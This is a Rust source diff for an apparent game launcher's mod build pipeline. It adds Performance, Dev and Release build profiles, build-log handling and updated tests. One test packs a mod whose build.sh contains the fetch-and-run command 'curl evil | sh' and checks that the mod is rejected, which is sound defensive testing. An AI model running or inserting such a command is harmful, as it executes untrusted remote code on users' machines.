@@ -39,41 +39,65 @@ pub const MIXINS_REV: &str = "ddd9700b21997c95d95ac6ee5ecafe3830cf622a";
 /// The features of the release's own game (game-build.yml).
 const FEATURES: &str = "horizon-client/mods";
 
-/// The Cargo profile a native build compiles with. `Fast` (the workspace's `[profile.fast]`: no
-/// LTO, 16 codegen units, incremental) is the default, so changing a mod recompiles only
-/// `horizon-client`'s changed parts; `Release` is the release's own (thin LTO, one codegen unit):
-/// slower to build, slightly faster game. Each has its own folder under `native/target/` and its
-/// own key, so the two never mix.
-#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
+/// What a native build is compiled for. `Performance`, the default, is the workspace's `fast` (16
+/// codegen units, incremental, thin-local LTO only), so changing a mod recompiles only `horizon-client`'s
+/// changed parts; `Dev`, for developing a mod, is `fast` with `horizon-client` unoptimized: the
+/// quickest to rebuild after an edit, for a game about twice as slow; `Release` is the release's
+/// own (thin LTO, one codegen unit): slowest to build, slightly faster game. `Performance` and
+/// `Dev` share `native/target/fast/`: every other crate is built alike, so switching between them
+/// recompiles only `horizon-client`, and Cargo keeps both builds of it. Each profile has its own
+/// key, so their builds never mix.
+#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
+#[serde(rename_all = "kebab-case")]
 pub enum Profile {
     #[default]
-    Fast,
+    Performance,
+    Dev,
     Release,
 }
 
 impl Profile {
-    /// Cargo's name for it, and its folder in `native/target/`.
+    /// The player's choices (the Mods page, `settings native-profile`).
+    pub const ALL: [Self; 3] = [Self::Performance, Self::Dev, Self::Release];
+
     pub fn name(self) -> &'static str {
         match self {
-            Self::Fast => "fast",
+            Self::Performance => "performance",
+            Self::Dev => "dev",
             Self::Release => "release",
         }
     }
 
+    /// The profile named `text`; `fast`, `Performance`'s name before `Dev`, still names it.
     pub fn parse(text: &str) -> Option<Self> {
         match text.trim() {
-            "fast" => Some(Self::Fast),
+            "performance" | "fast" => Some(Self::Performance),
+            "dev" => Some(Self::Dev),
             "release" => Some(Self::Release),
             _ => None,
         }
     }
 
-    /// The profile `Settings::native_release` picks.
-    pub fn from_setting(release: bool) -> Self {
-        if release {
-            Self::Release
-        } else {
-            Self::Fast
+    /// The settings' profile (`native_profile`, or the older `native_release` switch for
+    /// `Release`).
+    pub fn chosen(settings: &crate::backend::Settings) -> Self {
+        settings
+            .native_profile
+            .unwrap_or(if settings.native_release {
+                Self::Release
+            } else {
+                Self::Performance
+            })
+    }
+
+    /// The Cargo profile it compiles with (its folder in `native/target/`), and what it sets over
+    /// it as `cargo --config` values: here rather than in `[profile.fast]`, which the workspace's
+    /// own builds share.
+    fn cargo(self) -> (&'static str, &'static [&'static str]) {
+        match self {
+            Self::Performance => ("fast", &[]),
+            Self::Dev => ("fast", &["profile.fast.package.horizon-client.opt-level=0"]),
+            Self::Release => ("release", &[]),
         }
     }
 }
@@ -161,7 +185,7 @@ impl Plan {
         }
     }
 
-    /// The word in "Built in 42 s (fast, incremental)".
+    /// The word in "Built in 42 s (performance, incremental)".
     fn kind(&self) -> &'static str {
         match self {
             Self::UpToDate => "up to date",
@@ -225,19 +249,21 @@ fn read_records(path: &Path) -> std::collections::BTreeMap<String, Record> {
         .unwrap_or_default()
 }
 
-/// A build record's key in `built.json`: the profile for a game build (as it always was), the
-/// target's own name before it for a server one, so the two never read each other's record.
+/// A build record's key in `built.json`: the profile's folder in `native/target/` for a game
+/// build (as it always was), the target's own name before it for a server one, so the two never
+/// read each other's record. `Performance` and `Dev` share one: their last build in that folder.
 fn record_key(target: Target, profile: Profile) -> String {
+    let folder = profile.cargo().0;
     match target {
-        Target::Client => profile.name().into(),
-        Target::Server => format!("{}-{}", target.name(), profile.name()),
+        Target::Client => folder.into(),
+        Target::Server => format!("{}-{folder}", target.name()),
     }
 }
 
-/// The last build of `target` and `profile` that compiled, if the profile's folder in
-/// `native/target/` (the compiled crates both build from) is still there.
+/// The last build of `target` in `profile`'s folder in `native/target/`, if that folder (the
+/// compiled crates both build from) is still there.
 fn last_record(target: Target, profile: Profile) -> Option<Record> {
-    if !root().join("target").join(profile.name()).is_dir() {
+    if !root().join("target").join(profile.cargo().0).is_dir() {
         return None;
     }
     read_records(&records_path()).remove(&record_key(target, profile))
@@ -354,6 +380,40 @@ pub(crate) fn root() -> PathBuf {
 /// The build's log, kept until the next build.
 pub fn log_path() -> PathBuf {
     root().join("build.log")
+}
+
+/// Makes the build log fresh for a new attempt: its folder made, the last build's log
+/// emptied. The error says why it couldn't, so the Build log page can show it instead of
+/// the old file's contents.
+pub fn clear_log() -> Result<(), String> {
+    fs::create_dir_all(root()).map_err(|e| e.to_string())?;
+    fs::write(log_path(), "").map_err(|e| format!("{}: {e}", log_path().display()))
+}
+
+/// Appends `message` (with a newline) to the build log, so a failure that happens before any
+/// command runs is still recorded.
+pub fn append_log(message: &str) -> Result<(), String> {
+    let mut log = fs::OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open(log_path())
+        .map_err(|e| format!("{}: {e}", log_path().display()))?;
+    writeln!(log, "{message}").map_err(|e| e.to_string())
+}
+
+/// Records the whole attempt, including selection or export after compilation.
+fn logged<T>(build: impl FnOnce() -> Result<T, String>) -> Result<T, String> {
+    clear_log()?;
+    let result = build();
+    match &result {
+        Ok(_) => {
+            let _ = append_log("Build completed.");
+        }
+        Err(error) => {
+            let _ = append_log(&format!("The build failed: {error}"));
+        }
+    }
+    result
 }
 
 const MANIFEST: &str = "horizon-mixin.toml";
@@ -979,19 +1039,16 @@ fn has_mods_feature(source: &Path) -> bool {
     value.get("features").and_then(|f| f.get("mods")).is_some()
 }
 
-/// The profile the source at `source` builds with: `chosen`, except that `Fast` becomes `Release`
-/// (the release's own) for a revision whose Cargo.toml has no `[profile.fast]`.
+/// The profile the source at `source` builds with: `chosen`, except that one built on
+/// `[profile.fast]` becomes `Release` (the release's own) for a revision whose Cargo.toml has none.
 fn profile_of(source: &Path, chosen: Profile) -> Profile {
     if chosen == Profile::Release {
         return chosen;
     }
     let text = fs::read_to_string(source.join("Cargo.toml")).unwrap_or_default();
     let value: toml::Table = text.parse().unwrap_or_default();
-    match value
-        .get("profile")
-        .and_then(|p| p.get(Profile::Fast.name()))
-    {
-        Some(_) => Profile::Fast,
+    match value.get("profile").and_then(|p| p.get("fast")) {
+        Some(_) => chosen,
         None => Profile::Release,
     }
 }
@@ -1052,7 +1109,7 @@ fn about_in(dir: &Path) -> Option<About> {
 }
 
 /// The newest installed release or Nightly in `installed` (newest first).
-fn newest_installed(installed: &[String]) -> Option<&String> {
+pub(crate) fn newest_installed(installed: &[String]) -> Option<&String> {
     installed
         .iter()
         .find(|t| backend::is_game_tag(t) || t.starts_with("nightly-"))
@@ -1061,8 +1118,10 @@ fn newest_installed(installed: &[String]) -> Option<&String> {
 /// The installed version a build for an instance that plays `current` starts from: `current`
 /// itself, so a rebuild stays on the Horizon it plays (a native build's own revision, [`about`]).
 /// With `update`, or when it plays nothing installed, the newest installed release or Nightly.
+/// An imported build is no commit to build on: its game files' version is.
 pub fn base_for(current: Option<&str>, installed: &[String], update: bool) -> Option<String> {
-    match current {
+    let imported = current.and_then(crate::build_import::about).map(|a| a.base);
+    match imported.as_deref().or(current) {
         Some(v) if !update && installed.iter().any(|t| t == v) => Some(v.to_owned()),
         _ => newest_installed(installed).cloned(),
     }
@@ -1145,13 +1204,12 @@ pub fn version_for(
     bundles: &[Bundle],
 ) -> Result<String, String> {
     let mut hash = Sha256::new();
-    for part in [
-        mixins,
-        profile.name(),
-        target.features(),
-        rust_toolchain::VERSION,
-        revision,
-    ] {
+    let (cargo_profile, configs) = profile.cargo();
+    for part in [mixins, cargo_profile]
+        .into_iter()
+        .chain(configs.iter().copied())
+        .chain([target.features(), rust_toolchain::VERSION, revision])
+    {
         hash.update(part.as_bytes());
         hash.update([0]);
     }
@@ -1443,7 +1501,9 @@ fn compile(
     cmd.env("CARGO_TARGET_DIR", target_dir)
         .env("CARGO_TERM_PROGRESS_WHEN", "always")
         .env("CARGO_TERM_PROGRESS_WIDTH", "100");
-    cmd.args(["--locked", "--profile", profile.name()]);
+    let (cargo_profile, configs) = profile.cargo();
+    cmd.args(["--locked", "--profile", cargo_profile]);
+    cmd.args(configs.iter().flat_map(|config| ["--config", config]));
     if target == Target::Server {
         cmd.arg("--no-default-features");
     }
@@ -1522,7 +1582,8 @@ fn post_build_programs(
     progress: &impl Fn(Step),
 ) -> Result<Vec<(crates::PostBuild, PathBuf)>, String> {
     let steps = crates::post_builds(stage)?;
-    let profile = profile.name();
+    // The game's settings, so the crates it built are reused.
+    let (profile, configs) = profile.cargo();
     let _ = fs::remove_dir_all(programs);
     let mut out = Vec::new();
     for (i, step) in steps.into_iter().enumerate() {
@@ -1538,6 +1599,7 @@ fn post_build_programs(
             "--bin",
             &step.bin,
         ]);
+        cmd.args(configs.iter().flat_map(|config| ["--config", config]));
         run(
             cmd,
             &format!("Building {}'s post-build step", step.mod_id),
@@ -1667,12 +1729,13 @@ struct Built {
 /// The pipeline both targets build with ([`build`], [`build_server`]): `folder`'s mods on the
 /// Horizon revision they pin (else `base`'s, the installed version whose game files the build
 /// reuses: a native build's own revision when it is one, [`base_for`]), compiled as `target`
-/// (the game, or the headless engine) and installed as its own version, `native-<revision>-<key>`
-/// (the key hashes the revision, the mods' files, the tool's commit, the profile and the
-/// target). A build already made is used again. Mods pinning different revisions build on the
-/// newest one, with the newest horizon-mixins they name, only when the player agreed to try
-/// (`anyway`): else the error starts with [`MISMATCH`] and says which. Nothing of the player's
-/// outside the launcher's data is touched: no instance is edited and no version selected here.
+/// (the game, or the headless engine) and installed as its own version,
+/// `native-<revision>-<key>` (the key hashes the revision, the mods' files, the tool's commit,
+/// the profile and the target). A build already made is used again. Mods pinning different
+/// revisions build on the newest one, with the newest horizon-mixins they name, only when the
+/// player agreed to try (`anyway`): else the error starts with [`MISMATCH`] and says which.
+/// Nothing of the player's outside the launcher's data is touched: no instance is edited and
+/// no version selected here.
 fn pipeline(
     base: &str,
     folder: &Path,
@@ -1684,7 +1747,6 @@ fn pipeline(
     let started = std::time::Instant::now();
     backend::need_prepared(base)?;
     fs::create_dir_all(root()).map_err(|e| e.to_string())?;
-    let _ = fs::write(log_path(), "");
     // The mods are copied first: the build and its key use the copy, whatever happens to the
     // folder meanwhile.
     let incoming = root().join("mods.incoming");
@@ -1917,7 +1979,7 @@ fn pipeline(
         // Out of `target_dir` before any post-build bin is built there (`post_build_programs`).
         let binary = real.join("programs").join(target.binary());
         copy_out(
-            &target_dir.join(compiled.name()).join(backend::CLIENT),
+            &target_dir.join(compiled.cargo().0).join(backend::CLIENT),
             &binary,
         )?;
         let post = post_build_programs(
@@ -1975,19 +2037,21 @@ pub fn build(
     profile: Profile,
     progress: impl Fn(Step),
 ) -> Result<String, String> {
-    let built = pipeline(base, folder, anyway, profile, Target::Client, &progress)?;
-    instances::edit(&instance.id, |meta| {
-        meta.version = Some(built.version.clone())
-    })?;
-    prune(&built.version);
-    if built.plan != Plan::UpToDate {
-        progress(Step::Done {
-            secs: built.secs,
-            profile: built.profile,
-            plan: built.plan,
-        });
-    }
-    Ok(built.version)
+    logged(|| {
+        let built = pipeline(base, folder, anyway, profile, Target::Client, &progress)?;
+        instances::edit(&instance.id, |meta| {
+            meta.version = Some(built.version.clone())
+        })?;
+        prune(&built.version);
+        if built.plan != Plan::UpToDate {
+            progress(Step::Done {
+                secs: built.secs,
+                profile: built.profile,
+                plan: built.plan,
+            });
+        }
+        Ok(built.version)
+    })
 }
 
 /// Builds `folder`'s mods as the headless engine a dedicated server runs (`horizon-engine`,
@@ -2008,58 +2072,60 @@ pub fn build_server(
     profile: Profile,
     progress: impl Fn(Step),
 ) -> Result<PathBuf, String> {
-    if output.symlink_metadata().is_ok() {
-        return Err(trf(
-            "{path} already exists. Move it away, or build into another folder.",
-            &[("path", &output.display().to_string())],
-        ));
-    }
-    let parent = output
-        .parent()
-        .filter(|p| !p.as_os_str().is_empty())
-        .unwrap_or(Path::new("."));
-    fs::create_dir_all(parent).map_err(|e| e.to_string())?;
-    let output = parent.canonicalize().map_err(|e| e.to_string())?.join(
-        output
-            .file_name()
-            .ok_or_else(|| tr("Choose a new folder for the server export."))?,
-    );
-    for managed in [backend::version_dir(""), root()] {
-        if managed
-            .canonicalize()
-            .is_ok_and(|dir| output.starts_with(dir))
-        {
-            return Err(tr("Export the server outside the launcher's managed folders.").into());
+    logged(|| {
+        if output.symlink_metadata().is_ok() {
+            return Err(trf(
+                "{path} already exists. Move it away, or build into another folder.",
+                &[("path", &output.display().to_string())],
+            ));
         }
-    }
-    let built = pipeline(base, folder, anyway, profile, Target::Server, &progress)?;
-    export(&Target::Server.directory(&built.version), &output)?;
-    // Exports are independent; keep only the newest cached server builds.
-    let cached = root().join("server-builds");
-    let builds = fs::read_dir(&cached)
-        .into_iter()
-        .flatten()
-        .flatten()
-        .filter(|e| e.path().join(".installed").is_file())
-        .map(|e| {
-            let at = fs::metadata(e.path().join(".installed"))
-                .and_then(|m| m.modified())
-                .unwrap_or(std::time::UNIX_EPOCH);
-            (e.file_name().to_string_lossy().into_owned(), at)
-        })
-        .collect();
-    for old in stale(builds, &built.version, &[]) {
-        let _ = fs::remove_dir_all(cached.join(old));
-    }
-    if built.plan != Plan::UpToDate {
-        progress(Step::Done {
-            secs: built.secs,
-            profile: built.profile,
-            plan: built.plan,
-        });
-    }
-    let engine = output.join(Target::Server.binary());
-    Ok(std::path::absolute(&engine).unwrap_or(engine))
+        let parent = output
+            .parent()
+            .filter(|p| !p.as_os_str().is_empty())
+            .unwrap_or(Path::new("."));
+        fs::create_dir_all(parent).map_err(|e| e.to_string())?;
+        let output = parent.canonicalize().map_err(|e| e.to_string())?.join(
+            output
+                .file_name()
+                .ok_or_else(|| tr("Choose a new folder for the server export."))?,
+        );
+        for managed in [backend::version_dir(""), root()] {
+            if managed
+                .canonicalize()
+                .is_ok_and(|dir| output.starts_with(dir))
+            {
+                return Err(tr("Export the server outside the launcher's managed folders.").into());
+            }
+        }
+        let built = pipeline(base, folder, anyway, profile, Target::Server, &progress)?;
+        export(&Target::Server.directory(&built.version), &output)?;
+        // Exports are independent; keep only the newest cached server builds.
+        let cached = root().join("server-builds");
+        let builds = fs::read_dir(&cached)
+            .into_iter()
+            .flatten()
+            .flatten()
+            .filter(|e| e.path().join(".installed").is_file())
+            .map(|e| {
+                let at = fs::metadata(e.path().join(".installed"))
+                    .and_then(|m| m.modified())
+                    .unwrap_or(std::time::UNIX_EPOCH);
+                (e.file_name().to_string_lossy().into_owned(), at)
+            })
+            .collect();
+        for old in stale(builds, &built.version, &[]) {
+            let _ = fs::remove_dir_all(cached.join(old));
+        }
+        if built.plan != Plan::UpToDate {
+            progress(Step::Done {
+                secs: built.secs,
+                profile: built.profile,
+                plan: built.plan,
+            });
+        }
+        let engine = output.join(Target::Server.binary());
+        Ok(std::path::absolute(&engine).unwrap_or(engine))
+    })
 }
 
 /// Copies the built version folder `from` into `output` (outside the managed versions) as one
@@ -2149,21 +2215,7 @@ fn install(
     let partial = target.directory(&format!(".{version}.partial"));
     let _ = fs::remove_dir_all(&partial);
     fs::create_dir_all(&partial).map_err(|e| e.to_string())?;
-    for entry in fs::read_dir(&from).map_err(|e| e.to_string())?.flatten() {
-        let name = entry.file_name();
-        if !carried_over(&name, target) {
-            continue;
-        }
-        let to = partial.join(&name);
-        let copied = if entry.path().is_dir() {
-            backend::copy_dir(&entry.path(), &to)
-        } else {
-            // A clone is a new file: horizon-ctl and horizon-server keep their permissions.
-            horizon_prepare::clone_or_copy(&entry.path(), &to)
-                .and_then(|()| fs::set_permissions(&to, entry.metadata()?.permissions()))
-        };
-        copied.map_err(|e| format!("Could not copy {}: {e}", entry.path().display()))?;
-    }
+    copy_base(&from, &partial, target)?;
     let installed = partial.join(target.binary());
     fs::copy(binary, &installed).map_err(|e| format!("The built game: {e}"))?;
     fs::write(partial.join("native-mods.json"), about.to_string()).map_err(|e| e.to_string())?;
@@ -2175,6 +2227,27 @@ fn install(
         return Err(e);
     }
     fs::write(dir.join(".installed"), "").map_err(|e| e.to_string())
+}
+
+/// Copies version folder `from` into `to` but for what a new build of `target` makes its own
+/// ([`carried_over`]), cloned where the disk can. Also an imported build's start (`build_import`).
+pub(crate) fn copy_base(from: &Path, to: &Path, target: Target) -> Result<(), String> {
+    for entry in fs::read_dir(from).map_err(|e| e.to_string())?.flatten() {
+        let name = entry.file_name();
+        if !carried_over(&name, target) {
+            continue;
+        }
+        let to = to.join(&name);
+        let copied = if entry.path().is_dir() {
+            backend::copy_dir(&entry.path(), &to)
+        } else {
+            // A clone is a new file: horizon-ctl and horizon-server keep their permissions.
+            horizon_prepare::clone_or_copy(&entry.path(), &to)
+                .and_then(|()| fs::set_permissions(&to, entry.metadata()?.permissions()))
+        };
+        copied.map_err(|e| format!("Could not copy {}: {e}", entry.path().display()))?;
+    }
+    Ok(())
 }
 
 /// Whether a file of the version a build starts from goes into the new build. The game (the
@@ -2241,6 +2314,8 @@ fn stale(
 
 #[cfg(test)]
 mod tests {
+    static LOG_TEST: std::sync::Mutex<()> = std::sync::Mutex::new(());
+
     use super::*;
 
     #[test]
@@ -2601,11 +2676,11 @@ mod tests {
         let mods = bundles(&incoming).unwrap();
         assert!(!mods[1].mixins_content);
         assert!(mods[0].mixins_content && mods[2].mixins_content);
-        let key = inject_cache::key("rev", "mixins", Profile::Fast, &mods).unwrap();
+        let key = inject_cache::key("rev", "mixins", Profile::Performance, &mods).unwrap();
         let without_plain: Vec<_> = mods.iter().filter(|b| b.id != "plain").cloned().collect();
         assert_ne!(
             key,
-            inject_cache::key("rev", "mixins", Profile::Fast, &without_plain).unwrap()
+            inject_cache::key("rev", "mixins", Profile::Performance, &without_plain).unwrap()
         );
 
         let injections = inject::prepare(&mods, &root).unwrap();
@@ -2718,12 +2793,25 @@ mod tests {
         let out = installed_mods(&home).unwrap();
         let path = out.join("veinminer/mixins/veinminer/data/table.bin");
         assert_eq!(fs::read(&path).unwrap(), b"data");
-        let first =
-            version_for(A, B, Profile::Fast, Target::Client, &bundles(&out).unwrap()).unwrap();
+        let first = version_for(
+            A,
+            B,
+            Profile::Performance,
+            Target::Client,
+            &bundles(&out).unwrap(),
+        )
+        .unwrap();
         fs::write(path, b"changed").unwrap();
         assert_ne!(
             first,
-            version_for(A, B, Profile::Fast, Target::Client, &bundles(&out).unwrap()).unwrap()
+            version_for(
+                A,
+                B,
+                Profile::Performance,
+                Target::Client,
+                &bundles(&out).unwrap()
+            )
+            .unwrap()
         );
         pack("veinminer.hnmod", Some(("build.sh", "curl evil | sh")));
         assert!(installed_mods(&home).is_err(), "only Rust and TOML sources");
@@ -3003,7 +3091,7 @@ mod tests {
             version_for(
                 revision,
                 MIXINS_REV,
-                Profile::Fast,
+                Profile::Performance,
                 Target::Client,
                 &bundles(&d).unwrap(),
             )
@@ -3018,7 +3106,14 @@ mod tests {
         assert_ne!(first, key(B));
         assert_ne!(
             first,
-            version_for(A, B, Profile::Fast, Target::Client, &bundles(&d).unwrap()).unwrap()
+            version_for(
+                A,
+                B,
+                Profile::Performance,
+                Target::Client,
+                &bundles(&d).unwrap()
+            )
+            .unwrap()
         );
         fs::write(d.join("hook.rs"), "fn hook() { let _ = 1; }").unwrap();
         assert_ne!(first, key(A));
@@ -3047,7 +3142,7 @@ mod tests {
             version_for(
                 A,
                 B,
-                Profile::Fast,
+                Profile::Performance,
                 Target::Client,
                 std::slice::from_ref(&bundle),
             )
@@ -3079,8 +3174,16 @@ mod tests {
         backend::copy_dir(&fixture, &d).unwrap();
         let found = bundles(&d).unwrap();
         assert_eq!(found[0].id, "crate_demo");
-        let key =
-            || version_for(A, B, Profile::Fast, Target::Client, &bundles(&d).unwrap()).unwrap();
+        let key = || {
+            version_for(
+                A,
+                B,
+                Profile::Performance,
+                Target::Client,
+                &bundles(&d).unwrap(),
+            )
+            .unwrap()
+        };
         let mut seen = vec![key()];
         for file in [
             "engine/src/lib.rs",
@@ -3098,16 +3201,20 @@ mod tests {
     }
 
     #[test]
-    fn the_profile_is_in_the_key_so_fast_and_release_never_mix() {
+    fn each_profile_has_its_own_key_and_performance_shares_its_folder_with_dev() {
         let d = dir("profile-key");
         write_bundle(&d, "hello", "fn hook() {}");
         let found = bundles(&d).unwrap();
-        let fast = version_for(A, B, Profile::Fast, Target::Client, &found).unwrap();
-        let release = version_for(A, B, Profile::Release, Target::Client, &found).unwrap();
-        assert_ne!(fast, release);
+        let keys: std::collections::BTreeSet<_> = (Profile::ALL.into_iter())
+            .map(|p| version_for(A, B, p, Target::Client, &found).unwrap())
+            .collect();
+        assert_eq!(keys.len(), 3);
+        // The last build in `native/target/fast/` is either's, as `fast`'s was before `dev`.
+        assert_eq!(record_key(Target::Client, Profile::Performance), "fast");
+        assert_eq!(record_key(Target::Client, Profile::Dev), "fast");
         assert_eq!(
-            fast,
-            version_for(A, B, Profile::Fast, Target::Client, &found).unwrap()
+            record_key(Target::Server, Profile::Release),
+            "server-release"
         );
     }
 
@@ -3118,7 +3225,7 @@ mod tests {
         let d = dir("server-key");
         write_bundle(&d, "hello", "fn hook() {}");
         let found = bundles(&d).unwrap();
-        let key = |target: Target| version_for(A, B, Profile::Fast, target, &found).unwrap();
+        let key = |target: Target| version_for(A, B, Profile::Performance, target, &found).unwrap();
         assert_ne!(
             key(Target::Client),
             key(Target::Server),
@@ -3139,7 +3246,7 @@ mod tests {
                 stage,
                 target,
                 Path::new("/native/target"),
-                Profile::Fast,
+                Profile::Performance,
                 "horizon-client",
             )
             .get_args()
@@ -3306,6 +3413,7 @@ mod tests {
     /// and no instance is edited or version selected.
     #[test]
     fn a_server_build_refuses_an_existing_output_before_building() {
+        let _guard = LOG_TEST.lock().unwrap();
         let output = dir("server-output");
         let folder = dir("server-mods");
         write_bundle(&folder, "hello", "fn hook() {}");
@@ -3316,18 +3424,19 @@ mod tests {
             &folder,
             &output,
             true,
-            Profile::Fast,
+            Profile::Performance,
             |_| {},
         )
         .unwrap_err();
         assert!(err.contains("already exists"), "{err}");
+        assert!(fs::read_to_string(log_path()).unwrap().contains(&err));
         let managed = root().join("forbidden-export");
         let err = build_server(
             "v0.0.0-not-installed",
             &folder,
             &managed,
             true,
-            Profile::Fast,
+            Profile::Performance,
             |_| {},
         )
         .unwrap_err();
@@ -3345,17 +3454,69 @@ mod tests {
     }
 
     #[test]
-    fn fast_is_the_default_profile_and_the_setting_picks_release() {
-        assert_eq!(Profile::default(), Profile::Fast);
-        assert_eq!(Profile::from_setting(false), Profile::Fast);
-        assert_eq!(Profile::from_setting(true), Profile::Release);
-        assert_eq!(Profile::parse("fast"), Some(Profile::Fast));
-        assert_eq!(Profile::parse("release"), Some(Profile::Release));
+    fn the_setting_picks_the_profile_and_the_old_switch_still_picks_release() {
+        let mut settings = crate::backend::Settings::default();
+        assert_eq!(Profile::chosen(&settings), Profile::Performance);
+        settings.native_release = true;
+        assert_eq!(Profile::chosen(&settings), Profile::Release);
+        settings.native_profile = Some(Profile::Dev);
+        assert_eq!(Profile::chosen(&settings), Profile::Dev);
+        assert_eq!(Profile::parse("performance"), Some(Profile::Performance));
+        assert_eq!(Profile::parse("fast"), Some(Profile::Performance));
+        assert_eq!(Profile::parse(" release "), Some(Profile::Release));
         assert_eq!(Profile::parse("debug"), None);
-        assert!(!crate::backend::Settings::default().native_release);
+        let text = serde_json::to_string(&settings).unwrap();
+        assert!(text.contains("\"native_profile\":\"dev\""), "{text}");
+    }
+
+    /// The build log ([`clear_log`], [`append_log`]): fresh for every attempt, and an early
+    /// failure (before any command ran) recorded in it, in one test because they share the
+    /// one log file.
+    #[test]
+    fn the_log_is_fresh_per_attempt_and_keeps_early_failures() {
+        let _guard = LOG_TEST.lock().unwrap();
+        clear_log().unwrap();
+        append_log("the last build's output").unwrap();
+        clear_log().unwrap();
+        assert_eq!(fs::read(log_path()).unwrap(), b"");
+        append_log("a line").unwrap();
+        append_log("another").unwrap();
+        assert_eq!(fs::read_to_string(log_path()).unwrap(), "a line\nanother\n");
+        // A build that fails before anything runs empties the old log and says why.
+        let folder = dir("log-early");
+        write_bundle(&folder, "hello", "fn hook() {}");
+        let out = dir("log-early-out");
+        let err = build_server(
+            "v0.0.0-not-installed",
+            &folder,
+            &out.join("server"),
+            true,
+            Profile::Performance,
+            |_| {},
+        )
+        .unwrap_err();
+        assert!(err.contains("is not prepared yet"), "{err}");
+        let log = fs::read_to_string(log_path()).unwrap();
+        assert!(log.contains("is not prepared yet"), "{log}");
+        assert!(!log.contains("the last build's output"), "{log}");
+        // A failure after compiler output keeps those diagnostics and the final reason.
+        let failure: Result<(), String> = logged(|| {
+            append_log("error[E0425]: cannot find value `missing` in this scope")?;
+            Err("Could not export the engine".into())
+        });
+        assert!(failure.is_err());
+        let log = fs::read_to_string(log_path()).unwrap();
+        assert!(log.starts_with("error[E0425]"), "{log}");
+        assert!(
+            log.ends_with("The build failed: Could not export the engine\n"),
+            "{log}"
+        );
+        assert!(!log.contains("Build completed."), "{log}");
+        let success: Result<(), String> = logged(|| Ok(()));
+        success.unwrap();
         assert_eq!(
-            (Profile::Fast.name(), Profile::Release.name()),
-            ("fast", "release")
+            fs::read_to_string(log_path()).unwrap(),
+            "Build completed.\n"
         );
     }
 
@@ -3408,18 +3569,18 @@ mod tests {
     #[test]
     fn the_steps_name_the_profile_and_the_outcome() {
         assert_eq!(
-            Step::Plan(Plan::UpToDate, Profile::Fast).label(),
-            "Up to date (no build needed) (fast)"
+            Step::Plan(Plan::UpToDate, Profile::Performance).label(),
+            "Up to date (no build needed) (performance)"
         );
         let compile = Step::Compile {
             done: 12,
             total: Some(430),
             name: "serde".into(),
-            profile: Profile::Fast,
+            profile: Profile::Performance,
         };
         assert_eq!(
             compile.label(),
-            "Compiling the game (fast): 12 of 430 crates, now serde"
+            "Compiling the game (performance): 12 of 430 crates, now serde"
         );
         let done = |secs, profile, plan| Step::Done {
             secs,
@@ -3427,8 +3588,8 @@ mod tests {
             plan,
         };
         assert_eq!(
-            done(42, Profile::Fast, Plan::Incremental(vec![])).label(),
-            "Built in 42 s (fast, incremental)"
+            done(42, Profile::Performance, Plan::Incremental(vec![])).label(),
+            "Built in 42 s (performance, incremental)"
         );
         assert_eq!(
             done(125, Profile::Release, Plan::First).label(),
@@ -3571,7 +3732,7 @@ mod tests {
             &stage,
             Target::Client,
             Path::new("/native/target"),
-            Profile::Fast,
+            Profile::Performance,
             "horizon-client",
         );
         let args: Vec<String> = cmd
@@ -3603,7 +3764,7 @@ mod tests {
             &stage,
             Target::Client,
             Path::new("/native/target"),
-            Profile::Fast,
+            Profile::Performance,
             "horizon-client",
         );
         let args: Vec<_> = cmd.get_args().collect();
@@ -3612,17 +3773,17 @@ mod tests {
     }
 
     #[test]
-    fn builds_use_the_fast_profile_where_the_source_has_it() {
+    fn builds_fall_back_to_release_where_the_source_has_no_fast_profile() {
         let d = dir("profile");
-        assert_eq!(profile_of(&d, Profile::Fast), Profile::Release);
+        assert_eq!(profile_of(&d, Profile::Performance), Profile::Release);
         fs::write(d.join("Cargo.toml"), "[profile.release]\nlto = \"thin\"\n").unwrap();
-        assert_eq!(profile_of(&d, Profile::Fast), Profile::Release);
+        assert_eq!(profile_of(&d, Profile::Performance), Profile::Release);
         fs::write(
             d.join("Cargo.toml"),
             "[profile.release]\nlto = \"thin\"\n[profile.fast]\ninherits = \"release\"\n",
         )
         .unwrap();
-        assert_eq!(profile_of(&d, Profile::Fast), Profile::Fast);
+        assert_eq!(profile_of(&d, Profile::Performance), Profile::Performance);
         assert_eq!(
             profile_of(&d, Profile::Release),
             Profile::Release,
@@ -3631,16 +3792,35 @@ mod tests {
         let rust = Toolchain {
             dir: PathBuf::from("/rust/1.99.1-x"),
         };
-        let cmd = compile(
-            &rust,
-            &d,
-            Target::Client,
-            Path::new("/native/target"),
-            Profile::Fast,
-            "horizon-client",
+        let args = |profile| -> Vec<String> {
+            compile(
+                &rust,
+                &d,
+                Target::Client,
+                Path::new("/native/target"),
+                profile,
+                "horizon-client",
+            )
+            .get_args()
+            .map(|a| a.to_string_lossy().into_owned())
+            .collect()
+        };
+        let performance = args(Profile::Performance);
+        assert!(performance.windows(2).any(|w| w == ["--profile", "fast"]));
+        assert!(!performance.contains(&"--config".to_string()));
+        let dev = args(Profile::Dev);
+        assert!(dev.windows(2).any(|w| w == ["--profile", "fast"]));
+        assert!(dev.windows(2).any(|w| w
+            == [
+                "--config",
+                "profile.fast.package.horizon-client.opt-level=0"
+            ]));
+        let release = args(Profile::Release);
+        assert!(release.windows(2).any(|w| w == ["--profile", "release"]));
+        assert!(
+            !release.contains(&"--config".to_string()),
+            "the release's own stays"
         );
-        let args: Vec<_> = cmd.get_args().collect();
-        assert!(args.windows(2).any(|w| w == ["--profile", "fast"]));
     }
 
     #[test]
